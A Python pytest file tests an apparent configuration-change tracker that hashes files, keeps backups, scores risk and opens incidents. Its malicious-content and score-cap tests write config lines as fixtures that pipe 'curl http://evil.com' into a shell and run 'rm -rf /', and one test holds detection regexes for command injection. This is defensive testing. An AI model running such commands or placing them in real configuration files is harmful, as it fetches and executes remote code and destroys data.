"""Tests for configuration change tracking and incident creation.

Tests the ConfigChangeTracker, ConfigRisk, and ConfigChangeRecord models
from elle.daemon.incidents.config_tracker.
"""

from __future__ import annotations

import hashlib
import os
import stat
from datetime import datetime
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from elle.daemon.incidents.config_tracker import (
    HIGH_RISK_CONFIGS,
    MALICIOUS_PATTERNS,
    ConfigChangeRecord,
    ConfigChangeTracker,
    ConfigRisk,
    get_config_backup,
    get_config_tracker,
)


# =============================================================================
# Fixtures
# =============================================================================


@pytest.fixture
def tracker(tmp_path: Path) -> ConfigChangeTracker:
    """Create a ConfigChangeTracker with a temporary backup directory."""
    backup_dir = tmp_path / "config_backups"
    return ConfigChangeTracker(backup_dir=backup_dir)


@pytest.fixture
def sample_config_file(tmp_path: Path) -> Path:
    """Create a sample configuration file."""
    config = tmp_path / "test.conf"
    config.write_text("server_name = example.com\nport = 8080\n")
    return config


@pytest.fixture
def empty_config_file(tmp_path: Path) -> Path:
    """Create an empty configuration file."""
    config = tmp_path / "empty.conf"
    config.write_text("")
    return config


@pytest.fixture
def binary_config_file(tmp_path: Path) -> Path:
    """Create a binary file to simulate non-text configs."""
    config = tmp_path / "binary.dat"
    config.write_bytes(b"\x00\x01\x02\xff\xfe\xfd" * 100)
    return config


# =============================================================================
# ConfigRisk Model Tests
# =============================================================================


class TestConfigRisk:
    """Tests for ConfigRisk model."""

    def test_create_config_risk(self) -> None:
        """Test basic ConfigRisk creation."""
        risk = ConfigRisk(
            severity="low",
            score=0.1,
            reasons=("Base check",),
            malicious_patterns_found=(),
            cascade_services=(),
        )
        assert risk.severity == "low"
        assert risk.score == 0.1
        assert risk.reasons == ("Base check",)

    def test_config_risk_defaults(self) -> None:
        """Test ConfigRisk uses default values for optional fields."""
        risk = ConfigRisk(severity="medium", score=0.5)
        assert risk.reasons == ()
        assert risk.malicious_patterns_found == ()
        assert risk.cascade_services == ()

    def test_config_risk_is_frozen(self) -> None:
        """Test that ConfigRisk is immutable."""
        risk = ConfigRisk(severity="high", score=0.7)
        with pytest.raises(Exception):
            risk.severity = "low"  # type: ignore[misc]

    def test_config_risk_score_bounds(self) -> None:
        """Test that score is clamped between 0 and 1."""
        risk = ConfigRisk(severity="low", score=0.0)
        assert risk.score == 0.0

        risk = ConfigRisk(severity="critical", score=1.0)
        assert risk.score == 1.0

        with pytest.raises(Exception):
            ConfigRisk(severity="low", score=-0.1)

        with pytest.raises(Exception):
            ConfigRisk(severity="low", score=1.1)

    def test_config_risk_critical_with_patterns(self) -> None:
        """Test ConfigRisk with malicious patterns detected."""
        risk = ConfigRisk(
            severity="critical",
            score=0.9,
            reasons=("Malicious patterns detected: 2",),
            malicious_patterns_found=(r"\$\([^)]*\)", r";\s*rm\s+-rf"),
            cascade_services=("ssh", "sshd"),
        )
        assert len(risk.malicious_patterns_found) == 2
        assert len(risk.cascade_services) == 2


# =============================================================================
# ConfigChangeRecord Model Tests
# =============================================================================


class TestConfigChangeRecord:
    """Tests for ConfigChangeRecord model."""

    def test_create_change_record(self) -> None:
        """Test basic ConfigChangeRecord creation."""
        record = ConfigChangeRecord(
            path="/etc/nginx/nginx.conf",
            change_type="modify",
            sha256_before="abc123",
            sha256_after="def456",
        )
        assert record.path == "/etc/nginx/nginx.conf"
        assert record.change_type == "modify"
        assert record.sha256_before == "abc123"
        assert record.sha256_after == "def456"
        assert record.is_elle_change is False

    def test_change_record_defaults(self) -> None:
        """Test ConfigChangeRecord default values."""
        record = ConfigChangeRecord(
            path="/etc/hosts",
            change_type="create",
        )
        assert record.sha256_before is None
        assert record.sha256_after is None
        assert record.size_before is None
        assert record.size_after is None
        assert record.is_elle_change is False
        assert record.incident_id is None
        assert record.backup_available is False
        assert record.backup_path is None
        assert record.risk is None
        assert isinstance(record.detected_at, datetime)

    def test_change_record_elle_change(self) -> None:
        """Test ConfigChangeRecord with ELLE attribution."""
        record = ConfigChangeRecord(
            path="/etc/ssh/sshd_config",
            change_type="modify",
            is_elle_change=True,
            incident_id="INC-12345678",
        )
        assert record.is_elle_change is True
        assert record.incident_id == "INC-12345678"

    def test_change_record_with_risk(self) -> None:
        """Test ConfigChangeRecord with embedded risk."""
        risk = ConfigRisk(severity="high", score=0.6)
        record = ConfigChangeRecord(
            path="/etc/shadow",
            change_type="modify",
            risk=risk,
        )
        assert record.risk is not None
        assert record.risk.severity == "high"

    def test_change_record_is_frozen(self) -> None:
        """Test that ConfigChangeRecord is immutable."""
        record = ConfigChangeRecord(
            path="/etc/hosts",
            change_type="create",
        )
        with pytest.raises(Exception):
            record.path = "/etc/passwd"  # type: ignore[misc]

    def test_change_record_delete_type(self) -> None:
        """Test ConfigChangeRecord for file deletion."""
        record = ConfigChangeRecord(
            path="/etc/old.conf",
            change_type="delete",
            sha256_before="oldhash",
        )
        assert record.change_type == "delete"
        assert record.sha256_after is None


# =============================================================================
# ConfigChangeTracker Tests
# =============================================================================


class TestConfigChangeTracker:
    """Tests for ConfigChangeTracker core logic."""

    def test_init_creates_backup_dir(self, tmp_path: Path) -> None:
        """Test that initialization creates the backup directory."""
        backup_dir = tmp_path / "backups"
        assert not backup_dir.exists()
        ConfigChangeTracker(backup_dir=backup_dir)
        assert backup_dir.exists()

    def test_init_default_backup_dir(self) -> None:
        """Test that default backup dir is used when none specified."""
        with patch.object(Path, "mkdir"):
            tracker = ConfigChangeTracker()
        assert tracker._backup_dir == Path("/var/lib/elle/config_backups")

    def test_register_elle_change(self, tracker: ConfigChangeTracker) -> None:
        """Test registering an ELLE change for attribution."""
        tracker.register_elle_change("/etc/nginx/nginx.conf", "INC-001")
        assert "/etc/nginx/nginx.conf" in tracker._elle_changes
        assert tracker._elle_changes["/etc/nginx/nginx.conf"] == "INC-001"

    def test_register_elle_change_overwrites(self, tracker: ConfigChangeTracker) -> None:
        """Test that re-registering for same path updates incident ID."""
        tracker.register_elle_change("/etc/hosts", "INC-001")
        tracker.register_elle_change("/etc/hosts", "INC-002")
        assert tracker._elle_changes["/etc/hosts"] == "INC-002"


class TestHashFile:
    """Tests for the _hash_file method."""

    def test_hash_file_normal(self, tracker: ConfigChangeTracker, sample_config_file: Path) -> None:
        """Test hashing a normal text file."""
        result = tracker._hash_file(sample_config_file)
        expected = hashlib.sha256(sample_config_file.read_bytes()).hexdigest()
        assert result == expected
        assert len(result) == 64  # SHA256 hex length

    def test_hash_file_empty(self, tracker: ConfigChangeTracker, empty_config_file: Path) -> None:
        """Test hashing an empty file."""
        result = tracker._hash_file(empty_config_file)
        expected = hashlib.sha256(b"").hexdigest()
        assert result == expected

    def test_hash_file_binary(self, tracker: ConfigChangeTracker, binary_config_file: Path) -> None:
        """Test hashing a binary file."""
        result = tracker._hash_file(binary_config_file)
        expected = hashlib.sha256(binary_config_file.read_bytes()).hexdigest()
        assert result == expected

    def test_hash_file_nonexistent(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
        """Test hashing a file that does not exist returns empty string."""
        missing = tmp_path / "nonexistent.conf"
        result = tracker._hash_file(missing)
        assert result == ""

    def test_hash_file_permission_error(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
        """Test hashing a file we cannot read returns empty string."""
        restricted = tmp_path / "restricted.conf"
        restricted.write_text("secret content")
        restricted.chmod(0o000)
        try:
            result = tracker._hash_file(restricted)
            assert result == ""
        finally:
            restricted.chmod(0o644)


class TestIdentifyCascadeServices:
    """Tests for the _identify_cascade_services method."""

    def test_nginx_config(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying nginx service for nginx config path."""
        services = tracker._identify_cascade_services(Path("/etc/nginx/nginx.conf"))
        assert "nginx" in services

    def test_ssh_config(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying SSH services for sshd_config path."""
        services = tracker._identify_cascade_services(Path("/etc/ssh/sshd_config"))
        assert "ssh" in services
        assert "sshd" in services

    def test_docker_config(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying docker service for docker config."""
        services = tracker._identify_cascade_services(Path("/etc/docker/daemon.json"))
        assert "docker" in services

    def test_resolv_conf(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying resolved service for resolv.conf."""
        services = tracker._identify_cascade_services(Path("/etc/resolv.conf"))
        assert "systemd-resolved" in services

    def test_unknown_config_path(self, tracker: ConfigChangeTracker) -> None:
        """Test that unknown config paths return no services."""
        services = tracker._identify_cascade_services(Path("/etc/myapp/custom.conf"))
        assert services == []

    def test_mysql_config(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying mysql services."""
        services = tracker._identify_cascade_services(Path("/etc/mysql/my.cnf"))
        assert "mysql" in services
        assert "mariadb" in services

    def test_systemd_config(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying systemd for systemd config."""
        services = tracker._identify_cascade_services(Path("/etc/systemd/system/foo.service"))
        assert "systemd" in services

    def test_netplan_config(self, tracker: ConfigChangeTracker) -> None:
        """Test identifying networkd for netplan config."""
        services = tracker._identify_cascade_services(Path("/etc/netplan/01-config.yaml"))
        assert "systemd-networkd" in services


class TestCreateIncident:
    """Tests for the _create_incident method."""

    def test_create_incident_external_modify(self, tracker: ConfigChangeTracker) -> None:
        """Test incident creation for external modify change."""
        risk = ConfigRisk(severity="medium", score=0.4, reasons=("Test",))
        record = ConfigChangeRecord(
            path="/etc/nginx/nginx.conf",
            change_type="modify",
            sha256_before="abc",
            sha256_after="def",
            risk=risk,
        )
        incident = tracker._create_incident(record)

        assert incident["domain"] == "config"
        assert incident["severity"] == "medium"
        assert incident["status"] == "open"
        assert "modified" in incident["title"]
        assert "(external)" in incident["title"]
        assert incident["trigger_source"] == "config_watcher"
        assert incident["outcome"] == "unknown"

    def test_create_incident_elle_change(self, tracker: ConfigChangeTracker) -> None:
        """Test incident creation for ELLE-initiated change."""
        risk = ConfigRisk(severity="low", score=0.1)
        record = ConfigChangeRecord(
            path="/etc/nginx/nginx.conf",
            change_type="modify",
            is_elle_change=True,
            incident_id="INC-EXISTING",
            risk=risk,
        )
        incident = tracker._create_incident(record)

        assert incident["status"] == "resolved"
        assert "(ELLE)" in incident["title"]
        assert incident["trigger_source"] == "elle_capability"
        assert incident["outcome"] == "improved"

    def test_create_incident_file_creation(self, tracker: ConfigChangeTracker) -> None:
        """Test incident creation for new file."""
        risk = ConfigRisk(severity="low", score=0.1)
        record = ConfigChangeRecord(
            path="/etc/myapp/new.conf",
            change_type="create",
            sha256_after="newhash",
            risk=risk,
        )
        incident = tracker._create_incident(record)

        assert "created" in incident["title"]
        assert incident["id"].startswith("CONFIG-")
        assert len(incident["id"]) == len("CONFIG-") + 8

    def test_create_incident_file_deletion(self, tracker: ConfigChangeTracker) -> None:
        """Test incident creation for file deletion."""
        risk = ConfigRisk(severity="high", score=0.5, reasons=("File deletion",))
        record = ConfigChangeRecord(
            path="/etc/important.conf",
            change_type="delete",
            sha256_before="oldhash",
            risk=risk,
        )
        incident = tracker._create_incident(record)

        assert "deleted" in incident["title"]
        assert incident["severity"] == "high"

    def test_create_incident_no_risk(self, tracker: ConfigChangeTracker) -> None:
        """Test incident creation when risk is None."""
        record = ConfigChangeRecord(
            path="/etc/test.conf",
            change_type="modify",
        )
        incident = tracker._create_incident(record)

        assert incident["severity"] == "info"
        assert incident["metrics_json"]["risk_score"] == 0.0
        assert incident["metrics_json"]["risk_severity"] == "low"

    def test_create_incident_with_backup(self, tracker: ConfigChangeTracker) -> None:
        """Test that backup info is included in metrics."""
        record = ConfigChangeRecord(
            path="/etc/test.conf",
            change_type="modify",
            backup_available=True,
            backup_path="/var/lib/elle/config_backups/test.conf.20240101_120000.abc12345",
        )
        incident = tracker._create_incident(record)

        assert incident["metrics_json"]["backup_available"] is True
        assert incident["metrics_json"]["backup_path"] is not None
        assert "Backup available for rollback." in incident["summary"]


# =============================================================================
# Async method tests
# =============================================================================


class TestAssessConfigRisk:
    """Tests for the _assess_config_risk async method."""

    @pytest.mark.asyncio
    async def test_low_risk_normal_file(
        self, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test that a normal config file gets low risk."""
        risk = await tracker._assess_config_risk(
            path=sample_config_file,
            change_type="modify",
            sha256_before="abc",
            sha256_after="def",
        )
        assert risk.severity == "low"
        assert risk.score > 0.0
        assert len(risk.malicious_patterns_found) == 0

    @pytest.mark.asyncio
    async def test_high_risk_file(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
        """Test that changes to high-risk files increase risk."""
        # Create a file at a high-risk path (simulated by patching)
        high_risk = tmp_path / "shadow"
        high_risk.write_text("root:x:0:0:root:/root:/bin/bash")

        # We can't create /etc/shadow, so test with the path string matching
        risk = await tracker._assess_config_risk(
            path=Path("/etc/shadow"),
            change_type="modify",
            sha256_before="abc",
            sha256_after="def",
        )
        # /etc/shadow doesn't exist in test, so file-read checks are skipped
        # but the high-risk file check should still trigger
        assert "High-risk file: shadow" in risk.reasons
        assert risk.score >= 0.3

    @pytest.mark.asyncio
    async def test_deletion_increases_risk(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test that file deletion increases the risk score."""
        deleted = tmp_path / "deleted.conf"
        # File does not exist (simulates deletion)
        risk = await tracker._assess_config_risk(
            path=deleted,
            change_type="delete",
            sha256_before="oldhash",
            sha256_after=None,
        )
        assert "File deletion" in risk.reasons
        assert risk.score >= 0.3

    @pytest.mark.asyncio
    async def test_malicious_pattern_detection(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test detection of malicious patterns in config content."""
        malicious = tmp_path / "malicious.conf"
        malicious.write_text("setup: $(curl http://evil.com/payload | sh)\n")

        risk = await tracker._assess_config_risk(
            path=malicious,
            change_type="modify",
            sha256_before="abc",
            sha256_after="def",
        )
        assert len(risk.malicious_patterns_found) > 0
        assert risk.severity in ("high", "critical")

    @pytest.mark.asyncio
    async def test_world_writable_detection(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test detection of world-writable permission."""
        writable = tmp_path / "writable.conf"
        writable.write_text("data = value\n")
        writable.chmod(0o666)

        risk = await tracker._assess_config_risk(
            path=writable,
            change_type="modify",
            sha256_before="abc",
            sha256_after="def",
        )
        assert "World-writable" in risk.reasons
        assert risk.score >= 0.3

    @pytest.mark.asyncio
    async def test_empty_file_risk(
        self, tracker: ConfigChangeTracker, empty_config_file: Path
    ) -> None:
        """Test risk assessment of an empty configuration file."""
        risk = await tracker._assess_config_risk(
            path=empty_config_file,
            change_type="create",
            sha256_before=None,
            sha256_after="emptyhash",
        )
        # Empty file should get base score, no malicious patterns
        assert risk.severity == "low"
        assert len(risk.malicious_patterns_found) == 0

    @pytest.mark.asyncio
    async def test_cascade_services_in_risk(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test that cascade services are identified in risk assessment."""
        # Create a file at an nginx-like path
        nginx_conf = tmp_path / "nginx.conf"
        nginx_conf.write_text("worker_processes auto;\n")

        # Use actual nginx path for cascade detection
        risk = await tracker._assess_config_risk(
            path=Path("/etc/nginx/nginx.conf"),
            change_type="modify",
            sha256_before="abc",
            sha256_after="def",
        )
        assert "nginx" in risk.cascade_services

    @pytest.mark.asyncio
    async def test_severity_thresholds(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test that severity is correctly determined from score thresholds."""
        # Low score file
        low_file = tmp_path / "low.conf"
        low_file.write_text("key = value\n")

        risk = await tracker._assess_config_risk(
            path=low_file,
            change_type="create",
            sha256_before=None,
            sha256_after="hash",
        )
        # Base score of 0.1 for a non-high-risk, non-malicious file
        assert risk.severity == "low"


class TestStoreBackup:
    """Tests for the _store_backup async method."""

    @pytest.mark.asyncio
    async def test_backup_existing_file(
        self, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test creating a backup of an existing file."""
        backup_path = await tracker._store_backup(sample_config_file, "abc12345")
        assert backup_path is not None
        assert Path(backup_path).exists()
        # Verify backup content matches original
        assert Path(backup_path).read_text() == sample_config_file.read_text()

    @pytest.mark.asyncio
    async def test_backup_nonexistent_file(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test backing up a file that no longer exists returns None."""
        missing = tmp_path / "gone.conf"
        result = await tracker._store_backup(missing, "somehash")
        assert result is None

    @pytest.mark.asyncio
    async def test_backup_filename_format(
        self, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test that backup filename contains expected components."""
        backup_path = await tracker._store_backup(sample_config_file, "abcdef01234567")
        assert backup_path is not None
        name = Path(backup_path).name
        # Name should contain: original filename, timestamp, hash prefix
        assert name.startswith("test.conf.")
        assert "abcdef01" in name


class TestHandleConfigChange:
    """Tests for the handle_config_change async method."""

    @pytest.mark.asyncio
    @patch("elle.daemon.incidents.config_tracker.ConfigChangeTracker._hash_file")
    async def test_handle_create(
        self, mock_hash: MagicMock, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test handling a file creation event."""
        mock_hash.return_value = "newhash123"

        mock_report = MagicMock()
        mock_report.incident_id = "INC-TEST"

        mock_store = MagicMock()
        mock_store.create_incident_draft = MagicMock(return_value=mock_report)
        mock_store.update_incident = MagicMock()

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await tracker.handle_config_change(
                path=sample_config_file,
                change_type="create",
            )

        assert result["domain"] == "config"
        assert "created" in result["title"]

    @pytest.mark.asyncio
    async def test_handle_modify_elle_change(
        self, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test handling a modification that ELLE initiated."""
        tracker.register_elle_change(str(sample_config_file), "INC-ELLE-001")

        mock_report = MagicMock()
        mock_report.incident_id = "INC-STORE"

        mock_store = MagicMock()
        mock_store.create_incident_draft = MagicMock(return_value=mock_report)
        mock_store.update_incident = MagicMock()

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await tracker.handle_config_change(
                path=sample_config_file,
                change_type="modify",
                sha256_before="oldhash",
            )

        assert "(ELLE)" in result["title"]
        assert result["status"] == "resolved"
        assert result["outcome"] == "improved"
        # After handling, the ELLE change should be consumed
        assert str(sample_config_file) not in tracker._elle_changes

    @pytest.mark.asyncio
    async def test_handle_change_store_import_error(
        self, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test graceful handling when incident store is not available."""
        # Remove the store module to simulate ImportError
        import sys

        saved = sys.modules.pop("elle.daemon.incidents.store", None)
        try:
            with patch.dict("sys.modules", {"elle.daemon.incidents.store": None}):
                # Should not raise, just log
                result = await tracker.handle_config_change(
                    path=sample_config_file,
                    change_type="create",
                )
        finally:
            if saved is not None:
                sys.modules["elle.daemon.incidents.store"] = saved
        # Result should still be returned even if store fails
        assert result is not None
        assert result["domain"] == "config"

    @pytest.mark.asyncio
    async def test_handle_change_store_exception(
        self, tracker: ConfigChangeTracker, sample_config_file: Path
    ) -> None:
        """Test graceful handling when incident store raises an error."""
        mock_store = MagicMock()
        mock_store.create_incident_draft = MagicMock(
            side_effect=RuntimeError("db locked"),
        )
        mock_store.update_incident = MagicMock()

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await tracker.handle_config_change(
                path=sample_config_file,
                change_type="modify",
                sha256_before="old",
                sha256_after="new",
            )
        assert result is not None

    @pytest.mark.asyncio
    async def test_handle_delete(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
        """Test handling file deletion when file no longer exists."""
        deleted = tmp_path / "deleted.conf"
        # File doesn't exist, simulating post-deletion state

        mock_report = MagicMock()
        mock_report.incident_id = "INC-DEL"

        mock_store = MagicMock()
        mock_store.create_incident_draft = MagicMock(return_value=mock_report)
        mock_store.update_incident = MagicMock()

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await tracker.handle_config_change(
                path=deleted,
                change_type="delete",
                sha256_before="oldhash",
            )

        assert "deleted" in result["title"]


# =============================================================================
# Singleton and Module-Level Function Tests
# =============================================================================


class TestGetConfigTracker:
    """Tests for the get_config_tracker singleton."""

    def test_returns_instance(self) -> None:
        """Test that get_config_tracker returns a ConfigChangeTracker."""
        with patch.object(Path, "mkdir"):
            import elle.daemon.incidents.config_tracker as mod

            mod._tracker = None
            instance = get_config_tracker()
            assert isinstance(instance, ConfigChangeTracker)
            # Clean up singleton for other tests
            mod._tracker = None

    def test_returns_same_instance(self) -> None:
        """Test that get_config_tracker returns the same singleton."""
        with patch.object(Path, "mkdir"):
            import elle.daemon.incidents.config_tracker as mod

            mod._tracker = None
            first = get_config_tracker()
            second = get_config_tracker()
            assert first is second
            mod._tracker = None


class TestGetConfigBackup:
    """Tests for the get_config_backup function."""

    @pytest.mark.asyncio
    async def test_backup_found(self) -> None:
        """Test retrieving backup info for a config file."""
        mock_incident = MagicMock()
        mock_incident.metrics = {
            "path": "/etc/nginx/nginx.conf",
            "backup_available": True,
            "backup_path": "/var/lib/elle/config_backups/nginx.conf.20240101",
            "sha256_before": "oldhash",
            "sha256_after": "newhash",
        }

        mock_store = MagicMock()
        mock_store.get_incident = MagicMock(return_value=mock_incident)

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await get_config_backup("INC-001", "/etc/nginx/nginx.conf")

        assert result is not None
        assert result["path"] == "/etc/nginx/nginx.conf"
        assert result["backup_path"] is not None

    @pytest.mark.asyncio
    async def test_backup_not_found_wrong_path(self) -> None:
        """Test that wrong path returns None."""
        mock_incident = MagicMock()
        mock_incident.metrics = {
            "path": "/etc/nginx/nginx.conf",
            "backup_available": True,
        }

        mock_store = MagicMock()
        mock_store.get_incident = MagicMock(return_value=mock_incident)

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await get_config_backup("INC-001", "/etc/apache2/apache2.conf")
        assert result is None

    @pytest.mark.asyncio
    async def test_backup_incident_not_found(self) -> None:
        """Test that nonexistent incident returns None."""
        mock_store = MagicMock()
        mock_store.get_incident = MagicMock(return_value=None)

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await get_config_backup("INC-NOPE", "/etc/hosts")
        assert result is None

    @pytest.mark.asyncio
    async def test_backup_import_error(self) -> None:
        """Test graceful handling when store is not importable."""
        import sys

        saved = sys.modules.pop("elle.daemon.incidents.store", None)
        try:
            with patch.dict("sys.modules", {"elle.daemon.incidents.store": None}):
                result = await get_config_backup("INC-001", "/etc/hosts")
        finally:
            if saved is not None:
                sys.modules["elle.daemon.incidents.store"] = saved
        assert result is None

    @pytest.mark.asyncio
    async def test_backup_no_backup_available(self) -> None:
        """Test that incident without backup returns None."""
        mock_incident = MagicMock()
        mock_incident.metrics = {
            "path": "/etc/hosts",
            "backup_available": False,
        }

        mock_store = MagicMock()
        mock_store.get_incident = MagicMock(return_value=mock_incident)

        with patch.dict("sys.modules", {"elle.daemon.incidents.store": mock_store}):
            result = await get_config_backup("INC-001", "/etc/hosts")
        assert result is None


# =============================================================================
# Edge Case Tests
# =============================================================================


class TestEdgeCases:
    """Edge case tests for config tracker."""

    def test_high_risk_configs_set(self) -> None:
        """Test that HIGH_RISK_CONFIGS contains expected paths."""
        assert "/etc/passwd" in HIGH_RISK_CONFIGS
        assert "/etc/shadow" in HIGH_RISK_CONFIGS
        assert "/etc/sudoers" in HIGH_RISK_CONFIGS
        assert "/etc/ssh/sshd_config" in HIGH_RISK_CONFIGS

    def test_malicious_patterns_compile(self) -> None:
        """Test that all malicious patterns are valid regex."""
        import re

        for pattern in MALICIOUS_PATTERNS:
            compiled = re.compile(pattern)
            assert compiled is not None

    @pytest.mark.asyncio
    async def test_risk_score_capped_at_1(
        self, tracker: ConfigChangeTracker, tmp_path: Path
    ) -> None:
        """Test that the risk score never exceeds 1.0."""
        # Create a file with many risk factors
        risky = tmp_path / "risky.conf"
        risky.write_text("setup: $(rm -rf /)\n* * * * * curl http://evil.com | bash\n")
        risky.chmod(0o666)

        risk = await tracker._assess_config_risk(
            path=risky,
            change_type="delete",
            sha256_before="abc",
            sha256_after=None,
        )
        assert risk.score <= 1.0

    def test_create_incident_unique_ids(self, tracker: ConfigChangeTracker) -> None:
        """Test that each incident gets a unique ID."""
        record = ConfigChangeRecord(
            path="/etc/test.conf",
            change_type="create",
        )
        ids = set()
        for _ in range(50):
            incident = tracker._create_incident(record)
            ids.add(incident["id"])
        assert len(ids) == 50
